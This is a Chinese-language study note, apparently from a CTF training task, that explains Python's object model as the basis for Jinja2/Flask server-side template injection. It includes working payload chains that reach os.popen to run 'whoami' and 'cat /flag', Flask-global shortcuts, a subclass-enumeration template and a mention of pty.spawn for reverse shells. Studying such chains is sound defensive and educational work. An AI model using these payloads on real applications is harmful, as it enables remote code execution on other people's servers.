# Python 面向对象模型与 SSTI 利用链基础

> 来源：task8 Part 1（2026-10-08）
> 环境：本机 Python 3.14.2 + Jinja2 3.1.6；实跑脚本在 `C:\Users\暗炎魔主\Desktop\task8\1-Python面向对象模型\`
> 一句话：搞懂 SSTI 的 payload 为什么长成那样 —— 每一个点号在 Python 对象模型里到底取到了什么。

## 1. 两条执行路：命令执行与代码执行

### 1.1 命令执行

**判断「哪种能用」的唯一标准是回显** —— 注入点拿不到 stdout 就等于没打进去。

| 函数 | 回显 | 返回值 | 在 SSTI 里 |
|---|---|---|---|
| `os.system(cmd)` | 无 | 退出码（int） | 能执行但看不到结果，基本没用 |
| `os.popen(cmd).read()` | 有 | 命令输出字符串 | 主用法 |
| `subprocess.check_output(cmd, shell=True)` | 有 | bytes / str | 常用 |
| `subprocess.run(cmd, shell=True, capture_output=True)` | 有 | CompletedProcess | 常用 |
| `subprocess.Popen(cmd, stdout=PIPE).communicate()` | 有 | 元组 | 可用 |
| `os.execv / os.execve` | 替换当前进程，不返回 | 无 | 不用 |
| `pty.spawn('/bin/sh')` | 交互 | 无 | Linux 反弹 shell 用 |
| `commands.getoutput(cmd)` | 有 | 字符串 | Python 2 专属，Py3 已删除 |

本机实测（Python 3.14.2）：

```
os.system('whoami')                返回值 = 0            <- 输出跑到进程 stdout，函数不返回内容
os.popen('whoami').read()          = 'laptop-59ul2kdl\暗炎魔主\n'
subprocess.check_output('whoami', shell=True, text=True) = 'laptop-59ul2kdl\暗炎魔主\n'
```

Python 2 的历史大坑：`input()` 等于 `eval(raw_input())`，用户输入直接当代码跑；Python 3 已改成普通读字符串。

### 1.2 代码执行

| 入口 | 能跑什么 | 关键限制 |
|---|---|---|
| `eval(expr)` | 单个**表达式** | 不能有语句，`eval('import os')` 直接 SyntaxError |
| `exec(code)` | 任意语句、整段代码 | **不返回值**，结果要自己塞进变量再取 |
| `compile(src, file, mode)` | 先编译成 code 对象 | 要配合 eval / exec 才运行 |
| `__import__('os')` | 按名字导入模块 | 最常被拿来做跳板 |
| `importlib.import_module('os')` | 同上，官方写法 | 需要先拿到 `importlib` |
| `getattr(obj, 'name')` | 按字符串取属性 | 过滤点号时用它绕 |
| `globals()` / `locals()` | 拿命名空间字典 | 从字典里捞函数和模块 |
| `pickle.loads()` / `yaml.load()` | 反序列化 | 反序列化 RCE |
| `timeit.timeit('...')` / `breakpoint()` | 冷门入口 | 代码审计会遇到 |

一句话记住区别：**eval 求值，exec 执行，compile 只编译。**

## 2. 五个「如何获取」：SSTI payload 的五个零件

三条底层直觉：

1. **一切皆对象**：类本身也是对象，它的类型是 `type`；`object` 是继承树的根。
2. **实例只存数据，方法挂在类上**：`d.__dict__` 里只有实例属性，`bark` 在 `Dog` 身上。
3. **继承链是一张能上下爬的图**：向上靠 `__base__` / `__mro__`，向下靠 `__subclasses__()`。SSTI 就是沿这张图爬回解释器。

### 2.1 实例 → 它的类

```python
d.__class__            # <class '__main__.Dog'>
type(d)                # 同上，两者没区别；写 payload 用 __class__，因为它是属性
d.__class__.__name__   # 'Dog'
```

payload 里 `''` 就是那个「模板里一定存在」的起点对象，`''.__class__` → `<class 'str'>`。

### 2.2 类 → 它的父类

```python
Dog.__base__    # 第一个直接父类
Dog.__bases__   # 元组，多继承时能看全
Dog.__mro__     # 方法解析顺序，一定以 object 结尾
```

`''` 的 MRO：

```
Python 3:  __mro__[0] = <class 'str'>   __mro__[1] = <class 'object'>
Python 2:  __mro__[0] = <class 'str'>   __mro__[1] = <class 'basestring'>   __mro__[2] = <class 'object'>
```

更稳的写法是 `__mro__[-1]`。

### 2.3 类 → 它的子类

```python
Animal.__subclasses__()   # 只返回「直接」子类，拿不到孙子类
object.__subclasses__()   # 所有直接继承 object 的类 —— 弹药库
```

本机实测（Python 3.14.2）：数量 180，`import warnings` 之后变成 185；`[0]` 是 `type`，`[1]` 是 `async_generator`。

两条关键结论：

- **数量和下标顺序会随「这个进程 import 了哪些模块」变化**，所以 payload 里的下标必须**现场枚举**，不能抄别人的 WP。
- `object` 只给直接子类，但已经够用：里面有 `warnings.catch_warnings`、`subprocess.Popen`、`os._wrap_close` 这类「身上带着模块全局」的类。

模板里枚举下标：

```jinja
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{{ loop.index0 }}:{{ c.__name__ }} {% endfor %}
```

`loop.index0` 从 0 开始（对应 `[...]` 下标），`loop.index` 从 1 开始。

### 2.4 类 → 它的某个方法

```python
Dog.__dict__              # 类的命名空间（mappingproxy）
list(Dog.__dict__.keys()) # ['__module__', '__firstlineno__', '__doc__', 'species', '__init__', 'bark', ...]
Dog.bark                  # <function Dog.bark>              函数对象
d.bark                    # <bound method Dog.bark of ...>   绑定方法
d.bark.__func__           # 剥回裸函数（Py2 是 im_func）
getattr(d, 'bark')        # 按字符串取，绕点号过滤用
Dog.__dict__['bark']      # 按名字从类字典取
```

payload 爱用 `__init__`：**每个类都有它**，不用猜名字。但必须挑**自己定义了 `__init__`** 的类，原因见第 4 节。

### 2.5 方法 → 它的全局命名空间（`__globals__`）

```python
Dog.bark.__globals__      # <class 'dict'>  函数定义所在模块的全局变量字典
```

**这是整条链的枢纽**：

- 模板命名空间里**没有** `os`、`sys`、`__import__`；
- 但任何一个 Python 函数身上都挂着「我所在的模块」，模块里 import 过的东西全在 `__globals__` 里；
- 于是 `类.__init__.__globals__['__builtins__']['__import__']('os')` 就等于**从模板表达式里把解释器抢回来**。

实测细节：

| 事实 | 实测结果 |
|---|---|
| 类型 | `dict` |
| 与模块字典的关系 | `sys.modules[f.__module__].__dict__ is f.__globals__` → `True` |
| 是引用还是拷贝 | **引用**：往里塞 `_demo_key`，`jinja2.utils.__dict__` 里也真的多了它 |
| 模块没 import `os` 时 | `g['os']` → `KeyError: 'os'`（不是 AttributeError） |
| 字典取值方式 | 只支持 `['os']`；`g.os` → `AttributeError: 'dict' object has no attribute 'os'` |

名称差异：Python 2 里叫 `func_globals`，Python 3 里叫 `__globals__`。

## 3. builtins 与 LEGB

Python 找名字的顺序是 LEGB：**L**ocal → **E**nclosing → **G**lobal → **B**uilt-in，四层都找不到才报 `NameError`。最后一层就是 `builtins` —— 所有名字的兜底仓库，`print`、`len`、`open`、`__import__`、`eval` 都住在这里，所以不 import 也能直接用。

**`__builtins__` 有两种形态，直接决定 payload 怎么写**：

| 场景 | `type(__builtins__)` | 写法 |
|---|---|---|
| `__main__` 里 | `<class 'module'>` | `.__builtins__.__import__` |
| 被 import 的模块里 | `<class 'dict'>` | `['__builtins__']['__import__']` |

稳妥写法是后者（字典场景更常见），或者先统一：`d = b if isinstance(b, dict) else vars(b)`。

`builtins` 里能直接拿来做代码 / 命令执行的：`__import__`、`eval`、`exec`、`compile`、`open`、`getattr`、`globals`、`locals`、`breakpoint`。

> 沙箱（如 Jinja2 的 `SandboxedEnvironment`）防的就是这里：拦截下划线开头的属性和危险函数名，让这条链在某一环断掉。

## 4. 把链串起来

本机实跑：

```
''.__class__.__mro__[1].__subclasses__() 长度 = 185
找到 warnings.catch_warnings 的下标          = 182
cls.__init__.__globals__ 里的关键项          = ['__builtins__', '__name__', 'sys', '_filters_mutated']
b['__import__']('os')                        = <module 'os' (frozen)>
os.popen('whoami').read()                    = laptop-59ul2kdl\暗炎魔主
```

逐步对应：

| 步 | 表达式 | 拿到什么 |
|---|---|---|
| 1 | `''` | 模板里一定存在的字符串 |
| 2 | `.__class__` | `<class 'str'>` |
| 3 | `.__mro__[1]` | `<class 'object'>`（继承树的根） |
| 4 | `.__subclasses__()` | 所有直接子类（弹药库） |
| 5 | `[182]` | `warnings.catch_warnings` |
| 6 | `.__init__` | 它的构造函数（自己定义的） |
| 7 | `.__globals__` | `warnings` 模块的全局字典 |
| 8 | `['__builtins__']` | 内建命名空间 |
| 9 | `['__import__']('os')` | `os` 模块 |
| 10 | `.popen('whoami').read()` | 命令回显 |

一行 payload（下标现场枚举）：

```jinja
{{ ''.__class__.__mro__[1].__subclasses__()[182].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}
```

**两条取 `os` 的路，先看模块里有没有**：

```python
# 路线一：模块里 import 过 os（实测 jinja2.utils 有）
os_mod = lipsum.__globals__["os"]

# 路线二：没有 os 时兜底走 builtins
b = some_class.__init__.__globals__["__builtins__"]
d = b if isinstance(b, dict) else vars(b)
os_mod = d["__import__"]("os")
```

Flask / Jinja2 环境里有更短的路（框架自己把 `os` import 进了某些函数的全局空间）：

```jinja
{{ get_flashed_messages.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
{{ lipsum.__globals__['os'].popen('cat /flag').read() }}
{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}
{{ url_for.__globals__['os'].popen('cat /flag').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
```

口诀：**下标型 payload 看环境，全局型 payload 看框架。**

## 5. Python 2 与 Python 3 的差异

| 项目 | Python 2 | Python 3 |
|---|---|---|
| `''` 的 MRO | `(str, basestring, object)`，object 在 `[2]` | `(str, object)`，object 在 `[1]` |
| 函数的全局空间 | `func_globals` | `__globals__` |
| 函数的字节码 | `func_code` | `__code__` |
| 类 | 有旧式类，不继承 `object` 就没有 `__mro__` / `__subclasses__` | 全是新式类 |
| 字符串 | `str` / `unicode` | `str` / `bytes` |
| 内建 | `file`、`raw_input`、`xrange`、`basestring`、`commands` | 已删除 |
| 命令执行回显 | `commands.getoutput` 也能用 | 只能 `os.popen` / `subprocess` |
| 字典顺序 | 无序，`__subclasses__()` 顺序更飘 | 3.7+ 有序，但数量仍随 import 变化 |

实战结论：

1. **先辨版本**：`{{ config }}`、报错页、`Server` 头、报错文案样式都能露出版本。
2. **`[1]` 还是 `[2]` 别猜**：直接打 `{{ ''.__class__.__mro__ }}` 看输出。
3. **下标别猜**：永远现场枚举 `__subclasses__()`。
4. **优先用不依赖下标的链**（`lipsum` / `cycler` / `url_for` / `get_flashed_messages`），跨版本稳。

## 6. 踩坑速查

| 现象 | 原因 | 对策 |
|---|---|---|
| `['os']` 报 `KeyError` | 该函数所在模块真的没 import `os`（如 `warnings`） | 走 `['__builtins__']['__import__']('os')` 兜底 |
| 取到 `object.__init__`，`hasattr(..., '__globals__')` 是 False | 类自己没定义 `__init__`，取到的是继承来的槽包装器 `wrapper_descriptor` | 挑**自己写了 `__init__`** 的类，如 `catch_warnings` |
| 以为 `__globals__` 是快照 | 它就是模块 `__dict__` 本体（引用） | 别往里写，会污染真模块 |
| `g.os` 报 `AttributeError` | `dict` 只支持 `[]` | 一律 `['os']` |
| 抄别人的 `[182]` 失败 | 下标随进程 import 情况变 | 先枚举出名字对应的下标 |
| `os.system('id')`「看起来没成功」 | 不回显，返回的只是退出码 | 用 `os.popen(...).read()` |
| `eval('import os')` 报错 | `import` 是语句，`eval` 只接受表达式 | 用 `exec` 或 `__import__('os')` |
| `vars(b)` 报 `TypeError` | `dict` 本身没有 `__dict__` | 先判 `isinstance(b, dict)` |
| `type(('os'))` 以为是元组 | 加括号不改变类型 | 写 `('os',)` 才是元组 |
